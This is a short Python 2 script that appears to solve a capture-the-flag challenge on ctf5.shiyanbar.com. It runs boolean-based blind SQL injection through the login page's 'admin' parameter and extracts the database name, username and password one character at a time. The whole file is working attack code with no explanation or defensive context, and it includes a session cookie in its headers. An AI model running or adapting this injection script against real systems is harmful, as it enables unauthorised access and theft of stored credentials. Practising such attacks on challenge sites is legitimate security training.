#coding:utf-8

#author:ch3rry

import httplib
import time
import sys

payloads = list('1234567890()qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@')

database = ''

a = '登录失败'

headers = {
			'Host': 'ctf5.shiyanbar.com',
			'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Cookie': 'Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1500944764,1501031527; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1501038074; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*77850%2CnickName%3Ach3rry; PHPSESSID=fq8gob41u1dpl6orccqhm91eq5',
			'Connection': 'keep-alive',
			'Upgrade-Insecure-Requests': '1'
}
print 'Start to retriev the Mysql database() || username || password:'
for i in range(1,15):
	for payload in payloads:
		#urls = "/basic/inject/index.php?admin=admin'+and+substr(database(),%s,1)='%s'+and+''='&pass=&action=login" %(i,payload)   //database
		#urls = "/basic/inject/index.php?admin=admin'+and+substr(username,%s,1)='%s'+and+''='&pass=&action=login" %(i,payload)		//username
		urls = "/basic/inject/index.php?admin=admin'+and+substr(password,%s,1)='%s'+and+''='&pass=&action=login" %(i,payload)
		conn = httplib.HTTPConnection('ctf5.shiyanbar.com',timeout=10)
		conn.request(method='GET',url=urls,headers=headers)
		r = conn.getresponse().read().decode('gb2312')
		print '*',
		if a.decode('utf-8') in r:
			database +=payload
			sys.stdout.write('\n[+]'+ database)
			break
print '\n[Done] database is : '+database